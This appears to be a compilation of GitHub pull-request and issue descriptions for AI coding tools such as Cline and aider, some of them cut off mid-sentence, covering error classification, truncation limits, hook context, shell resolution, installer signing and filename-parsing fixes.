title: fix(context): require a context-specific message for Anthropic context-window detection
body:
Follow-up to the non-blocking review comment on #12825.

## Problem

`checkIsAnthropicContextWindowError` treated **every** nested Anthropic `invalid_request_error` as a context-window overflow:

```ts
return response?.error?.error?.type === "invalid_request_error"
```

Anthropic uses `invalid_request_error` for a large family of rejections that have nothing to do with context size — invalid tool schema, oversized image, unknown model id, out-of-range `max_tokens`, malformed `messages`, out-of-range `temperature`. Every sibling detector in this file (OpenAI, OpenRouter, Cerebras, Bedrock, Vercel) gates on a status/type **and** a context-specific message pattern. The Anthropic branch was the only one that did not.

Two consequences, of different severity:

1. **Recovery bug (pre-existing).** `checkContextWindowExceededError` gates `handleContextWindowExceededError()` in the legacy task loop, so an unrelated Anthropic invalid request triggered a conversation truncation and a retry — which then failed again for the original reason, having already discarded conversation history. Silent, and it left the user worse off than a plain error would have.
2. **Telemetry (new since #12825).** `errorClass` on `task.provider_api_error` is derived from this same detector, so those unrelated failures were labeled `error_class = "context_window_exceeded"`, inflating the exact bucket #12825 exists to make countable — [ENG-2394](https://linear.app/cline-bot/issue/ENG-2394/vercel-ai-gateway-stream-error-occurred-on-final-response-synthesis).

**Note this changes recovery behavior, not just classification** — unlike #12825, which was observability-only. That is the point of the fix, but it means the blast radius is the truncate-and-retry path, not a dashboard.

## Change

Keep the existing type gate, then additionally require a context-specific message:

```ts
const CONTEXT_ERROR_PATTERNS = [
    /prompt is too long.*tokens?\s*>\s*\d+\s*maximum/i,
    /input is too long/i,
    /input length and max_tokens exceed context limit/i,
] as const
```

All three are reused rather than invented — the first two are already in `checkIsVercelContextWindowError`, the third in `checkIsBedrockContextWindowError`. All three are Anthropic-authored wire messages; Bedrock and the Vercel gateway just relay them, which is why they already appear in those branches.

Both the provider message (`error.error.message`) and the error's own `message` are checked. The Anthropic SDK sets `APIError.error` to the parsed response body and, because that body has no top-level `message`, JSON-stringifies the whole body into `APIError.message` — so depending on how the error reached us either path can be the one carrying the overflow text.

## Tradeoff

Narrowing means a genuine overflow whose message shape isn't matched loses auto-truncate recovery. Weighing the two directions:

- **False positive (status quo):** silent history loss plus a retry that cannot succeed, on *any* malformed-request bug. High frequency — it fires on developer errors and on ordinary user mistakes like attaching an oversized image — and the failure is invisible to the user.
- **Missed recovery (new risk):** the user sees the real overflow error and has to condense the conversation themselves. Lower frequency, and it degrades to the normal error path rather than corrupting state.

The false positive is both more likely and more damaging, so requiring the message is the right default. The residual risk is bounded: the three patterns cover every overflow message shape Anthropic currently emits, and matching the JSON-stringified `message` as well as the structured one means a wrapper that reshapes the error still matches.

Worth flagging for whoever touches this next: the pattern here is deliberately the strict Vercel one (`prompt is too long` **plus** the `tokens > N maximum` tail). The SDK arch uses a looser bare `\bprompt is too long\b`. If we ever see missed recoveries in the wild, relaxing to the looser form

title: fix(hooks): deliver tool hook contextModification to the model
body:
## Problem

On the next engine, a tool hook's `contextModification` never reaches the model. `parseHookControl` parses it into `HookControl.context`, but the runtime `beforeTool`/`afterTool` result contract has no channel for injecting conversation context, so the string is silently discarded. The legacy extension delivered it (documented as "immediately consumed and added to the conversation context"): `ToolExecutor`/`ToolHookUtils` pushed `<hook_context>` text blocks into the next user turn. This is a regression of shipped behavior.

Reported in #13277 (the `contextModification` half; the "hooks stopped firing in 4.1.10" half is separate). Ticket: [CLINE-2987](https://linear.app/cline-bot/issue/CLINE-2987/hook-contextmodification-never-reaches-the-model-on-the-next-engine)

## Change

- **Contract** (`sdk/packages/shared/src/agent.ts`): add optional `appendContext` to `AgentBeforeToolResult` and `AgentAfterToolResult`.
- **Runtime** (`sdk/packages/agents/src/agent-runtime.ts`): collect `appendContext` from beforeTool/afterTool hooks during an iteration's tool executions and append one user message of `<hook_context source="PreToolUse|PostToolUse">` blocks **after** the tool result messages. A single trailing user message (rather than text parts inside tool messages, or interleaved user messages) keeps tool-result parts contiguous and first in the merged user turn, which providers require; it also matches where legacy placed these blocks (same turn as the tool results).
- **Hook layers** (`hook-file-hooks.ts`, `subprocess.ts`): map `HookControl.context` into `appendContext` for `tool_call` (PreToolUse) hooks. On `cancel: true` the context is not injected — the parsed context is the hook's error message in that case, and legacy surfaced it as an error, never as conversation context.
- **Limits**: injected context is truncated at 50,000 characters per hook output, matching the legacy cap.
- **Merging**: `appendContext` from multiple hooks/layers is concatenated with blank lines (runtime loop + `mergeAgentHooks`), matching legacy aggregation.

Several existing tests asserted the dropped-context behavior (`expect(control).toBeUndefined()` for hooks returning `context`); their expectations now assert the context is returned.

## Not in this PR

- `tool_result` (PostToolUse) hooks currently run fire-and-forget with stdout ignored, so they still can't inject anything (nor cancel). Stacked follow-up PR makes them blocking and honors their output.
- Providers with the `provider-tools` capability (claude-code, openai-codex) skip tool hooks entirely (`executionMode: "provider"` short-circuits before the hook loop) — separate known limitation, noted in the ticket.
- UserPromptSubmit/TaskStart/TaskResume context injection (also live in legacy) remains dead — those events are fire-and-forget; follow-up candidate.

## Testing

- `bun -F @cline/agents test` (70 passed) — includes new runtime tests: hook context lands as the last user message on the next model request; no message appended when hooks return nothing/blank.
- Core hooks suite (37 passed): `contextModification` alias returned as `appendContext`; cancel suppresses injection; 50KB truncation; merge concatenation across layers.
- `bun -F @cline/shared -F @cline/agents -F @cline/core typecheck`, biome clean.

title: fix(sdk): stop re-truncating budgeted tool output, and make truncation limits configurable
body:
### Related Issue

**Issue:** #13263

### Description

Two truncation layers disagreed, and the tighter one silently won.

Tool executors budget their output to `MAX_COMMAND_OUTPUT_CHARS` (48k) and place their truncation notice in the preserved head/tail so it survives a later cut — `output-limits.ts` says so in its header. `MessageBuilder` then re-truncated **every** tool result to 8k while building the provider request. The model received 8k of a 48k result, and every executor budget below that was dead weight. `read_files` took the same path: `maxFileContentChars` (50k) applies only to top-level file attachments, not read results.

Three commits:

**1. `fix(sdk): stop the provider request from re-truncating budgeted tool output`**
The per-result cap now derives from the executor budget plus headroom for the notice executors append past it. Equality alone would not do — a capped `run_commands` result measures 48,113 chars, so cutting at exactly 48,000 re-cuts it and elides the notice from the middle, which is the failure `output-limits.ts` warns about.

**2. `fix(sdk): let the editor tool accept a whole file in one call`**
The editor rejected `old_text`/`new_text` over 6,000 chars and its schema told the model to split larger edits into chunks. Measured against this repo: only 0.6% of real edit hunks exceed 6k, but **32% of source files do**, so creating or rewriting one routinely took several calls. The guard only ever bounced complete, schema-valid payloads, a generation cut short by `max_tokens` fails validation earlier, so it never prevented the failure its own message described. Raised to 50,000 with the advice rewritten. This also splits `INPUT_ARG_CHAR_LIMIT`, which set both that guard and, doubled, the `run_commands` command-length advisory.

**3. `feat(sdk): make every context limit configurable`**
`settings/context-limits.ts` owns the caps and resolves them from env over explicit overrides over defaults. The message-builder variables grow from covering 3 limits to all 6 (existing names unchanged), and the nine tool caps gain `CLINE_TOOL_*` equivalents. Resolved values reach both the executors that enforce them and the descriptions that quote them, so the model is never told a number that no longer applies. Budgeted caps stay clear of the forwarding cap, so no override can reintroduce the re-cut from commit 1.

It also fixes three host paths that kept the compiled defaults and ignored any override: the VS Code file-read wrapper built executors with no options, and its `run_commands` tool used the constant directly in both its foreground and background paths.

**Related open issues**: 

- **#13278** reports the 6k chunking failure and a duplicate of #13263 (*"causes regular rework and often failures greatly slowing coding"*; the reporter reverted to 3.89.2). Commit 2 removes that trigger.
- **#13276** — a model invented an unavailable `write_file` tool after *"new_text was 7084 characters, exceeding the 6000 character limit."* Commit 2 removes the trigger; the underlying `AI_NoSuchToolError` handling is untouched.
- **#13545** asks for what commit 3 provides: *"could the limit be derived rather than fixed?… or simply exposed as a setting."* Its `insert_line` EOF off-by-one is **not** addressed here.

**On the cost** Raising the default per-result cap from 8k to 50k makes steady-state requests larger, and there are open issues regardingthis: #12111 and #12067 report context growing until it exceeds the model limit, #12118 reports memory growth over long sessions, #13089 hit a transport size limit, and #13134 notes whole-file edits are already token-expensive.  
Total request size is still governed by the 6MB aggregate budget and the compaction pipeline, neither of which changes here. The old 8k did not actually save the work it appeared to: truncated output can drive re-reads and repeated tool calls, which is the cost #13263's reporters describe. title: fix(tools): stabilize runTerminalCommand output capture for agents
body:
This PR fixes an issue where autonomous agents (or external MCP runtimes) attempting to observe terminal output through `runTerminalCommand` would frequently receive empty strings or garbled text instead of the actual command `stdout`.

**The Problem:**
1. **Login Shells:** The implementation previously invoked `bash -l` (login shell). In non-TTY background execution contexts, user `.bash_profile` or `.bashrc` scripts often hang, execute interactive terminal-only utilities (like `tmux`), or prematurely `exit`, causing the node `child_process` to capture no output.
2. **ANSI Color Pollution:** `getColorEnv()` previously forced `FORCE_COLOR=1` and `TERM=xterm-256color`. While this looks great in the UI, agents expecting machine-readable text struggle to parse ANSI-polluted streams, and some CLI tools alter their output buffering behavior when they detect forced color sequences in a non-TTY pipe.

**The Solution:**
- Replaced the login shell flag `-l` with a standard `/bin/bash -c` execution to bypass user-specific interactive profile quirks.
- Modified `getColorEnv()` to explicitly request a plaintext environment (`NO_COLOR="1"`, `TERM="dumb"`), ensuring that the output returned to the agent is clean and strictly decodable.

**Testing:**
Verified locally that terminal execution commands reliably return their stdout streams to external LLM runtimes without hangs or formatting corruption.

title: Fix GitHub Copilot authentication flow
body:
## Summary
This PR fixes the GitHub Copilot authentication flow in OpenCode, which currently has issues with token retrieval and exchange.

## Problem Description
Currently, the GitHub Copilot integration has several issues:

1. The code tries to use standard GitHub tokens (like those from `gh auth token`) which don't work with Copilot API because they lack the required Copilot scope
2. There's no proper authentication flow when no token is found
3. The token exchange process fails due to missing required headers and incorrect API version
4. Missing documentation on how to properly set up and use the Copilot integration

## Solution
This PR implements a complete authentication flow inspired by the one used in the Neovim Copilot plugin:

1. Properly checks for Copilot tokens in standard locations (hosts.json and apps.json)
2. Implements OAuth device code flow when no token is found
3. Adds proper GitHub API headers including the correct API version (X-GitHub-Api-Version: 2022-11-28)
4. Uses the standard Copilot client ID (same as used by VS Code and Neovim plugins)
5. Stores tokens in the standard location for reuse across sessions

## Documentation
Added comprehensive documentation to the README explaining:
- How to configure Copilot in OpenCode
- The authentication flow process
- Where tokens are stored

This PR makes Copilot integration work seamlessly with OpenCode, especially important for users wanting to access Claude models through Copilot.

## What this builds

The independent part of the Onboarding agent initiative (spec `docs/specs/initiative-onboarding-agent.md`, sections 5 and 4.2): the in-tree recipe catalog and the onboarding MCP server. Stacks on the Initiative 2 SDK PR (#263, base `feat/260-sdk-connect`), which provides `tally.init`, the module-level `record_*` convenience, and the `TallyClient` methods the recipes validate against.

### Recipe catalog (`sdk/python/recipes/`, section 5)
- `schema.json`: the recipe schema (section 5.2).
- `index.yaml` plus one machine-readable YAML recipe per common component:
  - FastAPI / Flask / Django account + feature middleware
  - Pinecone / Weaviate / Qdrant / pgvector vector calls
  - a tool-call recipe and an embedding recipe
  - the OTel-ingest recipe
- Each recipe's `sdk_surface` carries `call` (the module-level `tally.record_*` convenience form) and `delegates_to` (the `TallyClient` method it wraps), per the spec fix.

### Anti-hallucination guard (`tests/test_recipes.py`, `onboarding_mcp/sdk_surface.py`)
Validates every recipe against the schema, then **resolves the emitted call, not just a method name**: it parses each `edit.template`, finds every `tally.*(...)` call it actually emits, resolves each against the real SDK public surface, and binds the passed kwargs to the delegate's real signature (from `sdk/python/src/tally/client.py` and `context.py`). A template that calls a nonexistent function, passes an unknown kwarg, omits a required arg, or declares a bogus `required_arg` fails. Negative tests prove the guard rejects each of those.

### MCP server (`sdk/python/onboarding_mcp/`, section 4.2)
Exposes `detect_stack`, `get_recipe`, `generate_middleware`, `instrument_call_site`, and `explain_layer` over the catalog and the SDK surface; `coverage_report` is stubbed against the spec contract. Honest under uncertainty: the no-recipe path and the unanswered-account path return a reported gap, never a fabricated `record_*` call. The tools are plain importable functions; `server.py` binds them to MCP lazily, so the SDK test suite needs no MCP stack and the SDK runtime stays dependency-free (`pyyaml` / `jsonschema` are dev-only).

The server holds only recipes and generated code, never a repo.

- The gateway per-layer coverage probe (section 7 / P3).
- The web dashboard Q&A snippet + coverage panel (section 4.1).

title: fix(coders): catch doubled-prefix hallucinations in edit-block headers
body:
## Summary
Catch doubled-prefix hallucinations like `.claude/.claude/foo.json` (when the chat file is `.claude/foo.json`) by extending the existing prepended-bogus-dir guard with progressive suffix-stripping against `chat_files` / `valid_fnames`. Closes #5111.

## Why
Observed in production dispatch across small editor models (`groq/llama-3.3-70b-versatile`, `openrouter/openai/gpt-oss-120b`, `gemini-2.5-flash-lite`). Existing basename-only guard in `WholeFileCoder` and basename+fuzzy guards in `find_filename` miss multi-segment doubled prefixes; result is a 0-byte canonical file and content at a doubled path.

## Changes
- `aider/coders/wholefile_coder.py`: after basename guard, try progressively shorter suffixes against `chat_files`.
- `aider/coders/editblock_coder.py:find_filename`: same pattern, between basename and fuzzy match (catches cases where `SequenceMatcher` ratio falls below the 0.8 cutoff).
- 2 tests covering both code paths, including a mutation-tested case where fuzzy match would otherwise miss (ratio 0.778 < 0.8).

## Risk
Low. Strict subset of behaviour:
- Only triggers when exact match and basename match both fail.
- Only resolves when a deterministic suffix is itself in `chat_files` / `valid_fnames`.
- No behaviour change on any path that currently resolves correctly.

## Test plan
- [x] `pytest tests/basic/test_wholefile.py tests/basic/test_editblock.py` — 38 passed (was 36 before)
- [x] Mutation test: confirmed both new tests fail without the fix (return doubled path verbatim)

title: SDK never recovers from a server-rejected stream token
body:
### Checklist

- [x] I could not find a solution in the documentation, the existing issues or discussions.
- [ ] I already asked for help in the chat

### In which Project did the bug appear?

_No response_

### If you selected \"Other\" as Project, please enter in which project the bug occurred.

_No response_

### On which platform did the bug appear?

Chrome

### SDK Version

_No response_

### Describe the problem caused by this bug

Hello, this would be great for safe server downgrades. I hope the hallucinations are low, but the core problem with stream_token is valid.

When a homeserver rejects a persisted stream token with **HTTP 400**, the SDK keeps re-sending the
identical token indefinitely and has no path back to a working state.

* On `/sync`, `Client._innerSync` retries every `syncErrorTimeoutSec` (default **3 s**) forever. The
  account receives **no events at all** — messages, receipts, device lists and to-device (Megolm key)
  traffic all stop.
* On `/messages`, `Room.requestHistory` propagates the `MatrixException` to the caller and leaves the
  poisoned `prev_batch` **persisted in the database**, so every later back-scroll in that room fails
  again — including after an app restart.

The only escape we found is a full token reset (re-login or clearing app data). The SDK cannot heal
itself, and the failure is invisible to the user beyond "the app never loads".

This is a client-robustness bug, not a spec violation by the server: a 400 on a token *parameter* is
permanent by nature, so retrying the same bytes can never succeed.

## Environment

* SDK: code references below are against `main` (latest tag at time of writing: `v11.0.0`)
* Client user-agent observed: `Dart/3.12 (dart:io)`
* Homeserver: Synapse (see below for the version pair)

## What triggers it: a homeserver downgrade

Synapse serialises `StreamToken` as underscore-joined stream positions, and the number of fields
grows as new streams are added:

| Synapse | Fields | Added |
| --- | --- | --- |
| ≤ 1.139 | 10 | — |
| 1.140.0 | 11 | `thread_subscriptions_key` |
| 1.148.0 | 12 | `sticky_events_key` (MSC4354) |
| 1.154.0 | 13 | `quarantined_media_key` |
| 1.159.0 | 14 | `profile_updates_key` |

`StreamToken.from_string` pads **missing** trailing fields for backwards compatibility, but there is
no truncation for **extra** fields — a longer token fails the tuple unpack and is rejected:

* `/sync` → `400 M_UNKNOWN` `"Invalid stream token"`
* `/messages` → `400 M_UNKNOWN` `"'from' parameter is invalid"`
  (`SynapseError(400, ...)` defaults to `Codes.UNKNOWN`, hence `M_UNKNOWN` rather than `M_INVALID_PARAM`)

So any migration or rollback that moves an account to an **older** Synapse invalidates every token the
client has cached. In our case accounts moved from Synapse **1.155.0 (13 fields)** to **1.147.1
(11 fields)**; clients kept replaying 13-field tokens:

```
since=s5063_377400_0_157105_11348_84_7066_2043_0_133_2_1_1   → 400   (13 fields, minted by 1.155.0)
since=s5128_380078_0_165391_11467_84_7285_2197_0_133_2       → 200   (11 fields, minted by 1.147.1)
```

Upgrades are safe; downgrades are not. Restoring a database backup onto an older Synapse has the same
effect, so this is reachable outside migrations too.

## Why the client never recovers

### 1. `/sync` — only `M_UNKNOWN_TOKEN` is handled

`lib/src/client.dart`

* `2477` — the request sends `since: prevBatch`
* `2545` — `} on MatrixException catch (e, s) {` emits `SyncStatus.error`
* `2553` — the **only** error acted upon is `MatrixError.M_UNKNOWN_TOKEN` (access-token expiry →
  soft logout / `clear()`)
* Any other `MatrixException` — including our 400 on `since` — falls through with **no state change**.
  `_prevBatch` is only ever assigned from a *successful* response (`2527`), so it is never cleared.
* `1878` / `2454` — `syncErrorTimeoutSec = 3` is a **fixed** delay with no exponential backoff, so the
  loop re-issues the same doomed request every 3 s indefinitely.

title: Build and Authenticode-sign a Windows x64 desktop installer in desktop releases
body:
### Description

Adds Windows as a desktop release platform, with Authenticode signing via the same Azure Trusted Signing account the CLI pipeline uses (#13021). Desktop releases were macOS-only until now.

**New `build-windows` job in `desktop-publish.yml`** (runs alongside the macOS build for both stable and beta channels):
- Builds the x64 NSIS installer on `windows-latest` (`tauri build --bundles nsis`, same channel `--config` overlays as macOS). MSI/WiX is deliberately skipped; the updater consumes the NSIS artifact.
- Authenticode-signs every binary through Tauri's `bundle > windows > signCommand` hook, which the bundler invokes for the main exe, the code-sidecar external binary, the NSIS uninstaller, and the installer itself (confirmed against tauri-bundler source: `sign_binaries_if_needed` + per-artifact `try_sign`).
- The hook runs `apps/examples/desktop-app/scripts/tauri-sign-windows.ps1`: jsign 7.5 (sha256-pinned) with `--storetype TRUSTEDSIGNING`, token from the `azure/login` OIDC session (fetched per invocation so a long Rust build can't expire it; passed via env, never argv), Microsoft RFC 3161 timestamping, and per-file `Get-AuthenticodeSignature` verification. Same tool and flags as the CLI's signing action.
- Job runs in the `PublishDesktop` environment (for the Tauri updater key) with `id-token: write`; Azure OIDC authenticates via the environment-form federated credential (`repo:cline/cline:environment:PublishDesktop`) already provisioned on the `cline-cli-signing` Entra app.
- Fail-loud secret gate: all Azure + Tauri updater secrets are required; there is no unsigned fallback for desktop (unsigned Windows installers are pointless to ship).
- Mirrors the macOS job's guardrails natively: channel feed-endpoint verification (grep on the uncompressed exe, since NSIS compression defeats string searches on the installer), sidecar `--telemetry-selfcheck`, no Rust build cache (same cache-poisoning rationale), and a final independent `Get-AuthenticodeSignature` gate on the shipped installer plus the signed-in-place sidecar.

**Updater feed:** `generate-update-manifest.ts` now maps `<Product>_<version>_x64-setup.exe` (+ its minisign `.sig`, produced by `createUpdaterArtifacts`) to a `windows-x86_64` platform entry; macOS entries are unchanged. The `release` job now needs `build-windows`, so a broken Windows build fails the whole release rather than silently shipping macOS-only.

**Azure/GitHub prerequisites (already provisioned, inert until this merges):** federated credential `github-cline-cline-env-publishdesktop`, and repo secret `AZURE_TRUSTED_SIGNING_CERTIFICATE_PROFILE_DESKTOP` (currently `cline-cli` — the desktop shares the CLI's certificate profile; Basic SKU allows one Public Trust profile, and a dedicated `cline-desktop` profile on Premium is a one-secret swap later).

Also updates the `publish-desktop` skill to describe the two-platform release.

### Test Procedure

- `bun test scripts/generate-update-manifest.test.ts`: 8/8 pass, including new cases for the `windows-x86_64` mapping, ignoring non-setup exes, and a missing Windows `.sig`.
- `actionlint` clean on the modified workflow (only the pre-existing `action-gh-release@v1` warning remains).
- `tauri-sign-windows.ps1` parses clean under PowerShell 7; endpoint normalization (trailing-slash tolerance) and the missing-env guard exercised directly.
- Signing mechanics (jsign on bun-compiled exes, Microsoft TSA, Trusted Signing auth) are already proven in production by the CLI pipeline from #13021.
- Windows-readiness of the app itself pre-verified: `cargo check --target x86_64-pc-windows-gnu` passes across the full crate graph including `cline-app` (with the Windows sidecar cross-compiled), `main.rs` has proper `#[cfg]` platform gating, and macOS-only crates are target-gated in `Cargo.toml`.
- **Not testable pre-merge:** the actual Windows runner build. Validate by cutting a beta release (`desktop-vX.Y.Z-beta.N`) after merge and chec

title: Resolve the gate's lookup context from the candidate document
body:
## What changed

- Fixes #545: binding a select to a Project data table through `add_fields` or `set_field_options_source` was refused with "Project lookup definitions are unavailable … wait for lookup data to reconnect", permanently. The canonical workspace's optimistic pre-commit gate resolved the lookup context from the snapshot twice on the single-batch path, so a batch that introduced a lookup reference was validated against a context with no definition for the new table. A first binding was refused as unavailable; a second table on an app already bound to one was refused as "not available in this Project". Chat edit turns and MCP share the workspace, so both were affected; chat builds (the change-set workspace) and the authoritative Postgres commit already unioned correctly.

title: Unknown MCP tool name is forwarded to the server and returns an opaque error instead of being validated against the connected server's catalog
body:
### Cline Surface

VSCode Extension

### Cline Version

4.1.4 (Legacy)

### Beta version

- [ ] I am using a beta version of Cline

### What happened?

When the model calls an MCP tool via `use_mcp_tool` with a tool name that the connected server did not advertise, Cline forwards the call to the server unchanged. The server then rejects it with a bare error such as `Unknown tool: 'get_note'`, which is surfaced with no indication of what the valid tool names are. Because Cline already fetched and cached the server's tool catalog at connect time (tool names and input schemas), it is in a position to catch this locally and respond helpfully, but it does not.

Expected: before dispatching `tools/call`, Cline validates the requested tool name against the connected server's advertised tools and, on a miss, returns a corrective error that lists the available tool names for that server (and ideally a hint to consult the "Connected MCP Servers" section). This turns a dead-end round trip into a one-turn self-correction.

Actual: the unknown name is forwarded and the only feedback is the server's opaque "Unknown tool" string, so the model cannot easily self-correct and a user watching the transcript sees a confusing failure.

---

Source pointers ([`v4.1.4` `McpHub.ts`](<https://github.com/cline/cline/blob/v4.1.4/apps/vscode/src/services/mcp/McpHub.ts>)): the tool catalog is fetched on connect via `fetchServerCapabilities` which calls `fetchToolsList`, and `fetchToolsList` issues `tools/list` and stores each tool's name, description, and input schema on `connection.server.tools`. In `callTool(serverName, toolName, ...)`, the method already looks up `connection` by server name (and throws a helpful "No connection found ... Connected MCP Servers" error when the server is unknown), then issues `tools/call` with the given `name: toolName` without ever checking that name against `connection.server.tools`. Because `connection.server.tools` is already populated at that point, adding a pre-dispatch name check (return a helpful error listing the valid tool names on a miss) is low risk and provider-independent. In v4.1.4, `callTool` does not itself iterate the tool list (auto-approve is managed separately), so this would be a small new guard at the top of `callTool`.

<details><summary>This is distinct from existing MCP issues, which concern argument handling and schema fidelity rather than tool-name validation.</summary>

* cline/cline#10553 (undefined args)
* cline/cline#10203 (int/bool sent as strings)
* cline/cline#12514 (Gemini array-to-string)
* cline/cline#10737 (task_progress leaking into tool calls)
* [#7960](<https://github.com/cline/cline/issues/7960>) (capabilities not respected)
* cline/cline#8087 (ephemeral tool IDs break routing).

None validate the tool name against the catalog before dispatch.

</details>

---

### Steps to reproduce

1. Connect any MCP server that exposes a small, specific tool set (for example a server whose only tools are `list_available_sources` and `search_internal_knowledge`).
2. Prompt the model with a task that invites a plausible-but-wrong tool name (for example "look up X", which tempts a `search` or `get_*` guess).
3. Observe that when the model calls a non-existent name such as `get_note`, `search`, or `list_tools`, Cline forwards it and the response is only the server's `Unknown tool: '...'` error, with no list of the real tools.

### Provider/Model

Anthropic Claude Opus 4.8 (`anthropic--claude-4.8-opus`) on the LiteLLM endpoint (OpenAI-compatible). The behavior is provider- and model-independent.

title: fix: eliminate duplicate system_reminder prompt injection in format_chat_chunks
body:
# Upstream Pull Request Proposal for `Aider-AI/aider`

## PR Title
`fix: eliminate duplicate system_reminder prompt injection in format_chat_chunks`

---

## PR Description

### Summary
Fixes a prompt duplication issue in `format_chat_chunks()` where `system_reminder` (typically 2,500–3,000 characters / ~600–750 tokens) was being injected **twice on every request** for all models configured with trailing reminders (`reminder in ("sys", "user")`).

Additionally, removes a duplicate 6-bullet examples list in `aider/coders/shell.py` where `shell_cmd_reminder` was an exact duplicate of `shell_cmd_prompt`.

---

### Root Cause
In `aider/coders/base_coder.py` (`format_chat_chunks()`):
1. **First injection (top of context)**: `main_sys += "\n" + self.fmt_system_prompt(self.gpt_prompts.system_reminder)` unconditionally appended `system_reminder` into the primary system prompt.
2. **Second injection (bottom of context)**: Lines ~1330–1341 created `reminder_message` containing the same `system_reminder` and sent it as a trailing `chunks.reminder` (or appended it to the final user message).

As a result, for modern LLMs (GPT-4o, Claude 3.5/3.7, Sonnet, Gemini, DeepSeek, Qwen), the entire ~750-token rules block was duplicated in both the system message and the trailing reminder chunk on **every single turn**.

---

### Key Changes
1. **`aider/coders/base_coder.py`**:
   Only append `system_reminder` to `main_sys` when trailing reminders are not active (`self.main_model.reminder == "none"`).
   ```python
   if self.main_model.reminder == "none" and self.gpt_prompts.system_reminder:
       main_sys += "\n" + self.fmt_system_prompt(self.gpt_prompts.system_reminder)
   ```
2. **`aider/coders/shell.py`**:
   Set `shell_cmd_reminder = ""` to avoid repeating the identical 6-bullet examples list that is already present in `shell_cmd_prompt`.
3. **`tests/basic/test_coder.py`**:
   Added regression test asserting that `system_reminder` is only present once in the formatted message chunks when `model.reminder == "sys"`.

---

### Measured Token Savings (Default `editblock` format)

| Component | Before Fix | After Fix | Net Reduction |
|---|---|---|---|
| System Prompt (`main_sys`) | ~5,117 chars (~1,279 tok) | ~2,078 chars (~519 tok) | **-760 tokens** |
| Trailing Reminder | ~3,039 chars (~760 tok) | ~2,486 chars (~621 tok) | **-139 tokens** |
| Total Injected Prompt Overhead | **~9,456 chars (~2,364 tok)** | **~5,864 chars (~1,466 tok)** | **~900 tokens saved / request** |

---

### Verification
- Ran full basic test suite: **478 passed**, 0 failed.
- Confirmed with OpenAI, Anthropic, and local OpenAI-compatible endpoints.

title: fix(shell): resolve the default shell through PATH
body:
### Related Issue

**Issue:** #13722

### Description

NixOS doesn't ship `/bin/bash` — bash lives in the Nix store and is only reachable through `PATH`. `getDefaultShell()` returned the absolute `"/bin/bash"`, so `spawn()` fails with `ENOENT` and every `run_commands` call dies before the agent can do anything.

Returning the bare name lets the OS resolve it through `PATH`.

The thing I wanted to avoid was fixing this with `process.env.SHELL`. The shell Cline executes and the syntax it advertises to the model are one contract: `describe()` in `definitions.ts` builds the `run_commands` description from `getShellKind(resolveShell())` — the same string the executor spawns. `$SHELL` can legitimately be fish or nushell, so selecting it while still teaching the model bash syntax would trade a clear failure for a confusing one.

`getShellKind()` classifies by basename, so `"bash"` still maps to `"posix"`. Nothing else moves:

- same invocation flags (`-c`), same prompting;
- Windows still gets `powershell`, and the WSL/cmd paths are untouched;
- an explicitly configured shell still wins (`configShell ?? getDefaultShell(...)`);
- when bash genuinely isn't installed, the failure is still a plain `spawn bash ENOENT`.

The two `@default` doc comments that documented `"/bin/bash"` are updated in the same change since they describe the value being changed.

### Test Procedure

A unit assertion on the new constant would only restate the change, so the regression test is behavioural: it points `PATH` at a temp directory whose only `bash` is a shim and asserts the shim actually ran. An absolute `/bin/bash` ignores `PATH` entirely and reaches the real shell instead, so the test fails on `main` for exactly the right reason:

```
expect(output.trim()).toBe("shim-on-path")
  → received "hello"   (i.e. /bin/bash ran, PATH was never consulted)
Tests  1 failed | 43 skipped (44)
```

Because this bug crosses the host boundary, I also reproduced the actual NixOS shape rather than relying on the unit test — a `bwrap` sandbox with a real, empty `/bin` and bash only under `/usr/bin`, running the real `createShellExecutor` from the built SDK:

```
/bin/bash present: false
default executor      -> "run_commands-works"
shell:"/bin/bash"     -> FAILED: Failed to execute command: spawn /bin/bash ENOENT
```

The second line is what `main` does today on NixOS; the first is this branch.

What could break and how I checked it:

- **Shell classification drifting** (the model being told the wrong syntax) — added a test pinning `getShellKind(getDefaultShell("linux")) === "posix"` and the `["-c", …]` invocation.
- **Windows / WSL** — `getDefaultShell("win32")` still returns `powershell`; the existing PowerShell/cmd/WSL cases in `shell.test.ts` are unchanged and passing.
- **Wider fallout** — full unit suite across the monorepo: `@cline/core` 2138, `@cline/cli` 1158, `@cline/llms` 785, `@cline/shared` 383, `@cline/cline-hub` 111, `@cline/agents` 72, `@cline/vscode` 4. `bun run build:sdk`, `typecheck` for `@cline/shared` + `@cline/core`, and `biome check` on the changed files are all clean; repo-level `lint`/`format` are byte-identical to `main`.

title: BUG: find_filename misses filenames when fenced block markers are indented
body:
## Summary

`find_filename` can miss a valid filename when the surrounding fenced block markers have leading whitespace.

Aider already supports recovering filenames from fenced blocks, and the `find_filename` docstring includes an indented fence example. In the current implementation, the loop stops early because it checks the raw line with `line.startswith("```")` instead of checking the stripped line.

## Steps to reproduce

Check out Aider main at commit `5dc9490bb35f9729ef2c95d00a19ccd30c26339c`.

Add the following test inside `TestUtils` in `tests/basic/test_editblock.py`:

```python
def test_find_filename_with_indented_fences(self):
    fence = ("```", "```")
    valid_fnames = ["dir/file3.py"]

    lines = ["  ```python", "file3.py", "  ```"]

    self.assertEqual(
        eb.find_filename(lines, fence, valid_fnames),
        "dir/file3.py",
    )
```

Run:

```bash
python -m pytest tests/basic/test_editblock.py -q
```

## Expected behavior

`find_filename` should treat indented fenced markers the same way as non-indented fenced markers when looking back for a filename, and return:

```text
dir/file3.py
```

## Actual behavior

The added regression test fails because `find_filename` returns `None`:

```text
FAILED tests/basic/test_editblock.py::TestUtils::test_find_filename_with_indented_fences
AssertionError: None != 'dir/file3.py'

1 failed, 25 passed in 1.32s
```

## Impact

When an LLM returns a SEARCH/REPLACE block with slightly indented fenced markers, Aider may fail to recover the filename even though the filename is present and matches a known repo file. This can make an otherwise valid edit block fail with a missing filename error.

## Root cause

Inside `find_filename`, each candidate line is first normalized by `strip_filename(line, fence)`, which strips whitespace before checking for fences.

But the continuation check uses the raw line:

```python
if not line.startswith(fence[0]) and not line.startswith(triple_backticks):
    break
```

For an indented fence like `"  ```"`, this condition becomes true and the loop breaks before it reaches the filename line.

## Possible fix direction

Use a stripped line for the fence-continuation check:

```python
stripped = line.strip()
if not stripped.startswith(fence[0]) and not stripped.startswith(triple_backticks):
    break
```

A regression test should cover both plain fenced blocks and indented fenced blocks.

## Version and model info

Aider: `0.86.3.dev`, `main@5dc9490bb35f9729ef2c95d00a19ccd30c26339c`  
Python: focused unit-level reproduction  
Operating system: macOS  
Installation: source checkout  
Edit format: search/replace  
Model: not applicable; reproduced by directly invoking deterministic filename parsing code

